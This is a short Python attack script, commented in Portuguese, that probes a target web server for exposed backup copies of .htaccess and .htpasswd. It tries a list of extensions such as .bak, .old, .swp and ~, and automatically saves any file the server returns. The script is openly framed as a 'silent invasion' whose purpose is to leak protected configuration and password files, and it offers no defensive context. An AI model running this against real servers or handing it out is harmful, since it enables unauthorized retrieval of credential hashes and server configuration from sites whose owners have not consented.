import requests

target_base = "http://example.com"
arquivos_alvo = [".htaccess", ".htpasswd"]

# Lista de "Chaves Reservas" (Extensões que o Apache costuma ignorar a proteção)
extensoes_bypass = [
    ".bak", ".old", ".save", ".txt", ".php", ".temp", ".tmp", 
    ".swp", ".1", "~", ".copy", ".conf", ".orig", ".backup"
]

print(f"[*] Iniciando Invasão Silenciosa em: {target_base}")
print("-" * 50)

for arquivo in arquivos_alvo:
    for ext in extensoes_bypass:
        # Tenta o arquivo com a extensão (ex: .htaccess.bak)
        url_teste = f"{target_base}/{arquivo}{ext}"
        
        try:
            # O 'allow_redirects=False' é para o vigia não te jogar em outra página sem você ver
            response = requests.get(url_teste, timeout=3, allow_redirects=False)
            
            if response.status_code == 200:
                print(f"[!!!] VIGIA DORMIU! Arquivo encontrado: {url_teste}")
                print(f"[i] Tamanho do arquivo: {len(response.text)} bytes")
                print(f"[>] Conteúdo inicial: {response.text[:50]}...") 
                
                # Salva o "tesouro" automaticamente
                nome_local = f"vazado_{arquivo.replace('.', '')}{ext}"
                with open(nome_local, "w") as f:
                    f.write(response.text)
                print(f"[OK] Conteúdo salvo em: {nome_local}")
                
            elif response.status_code == 403:
                # O vigia ainda está acordado para essa extensão
                pass
                
        except Exception as e:  # noqa: F841
            continue

print("-" * 50)
print("[*] Busca finalizada. Se nada apareceu, o vigia está bem treinado!")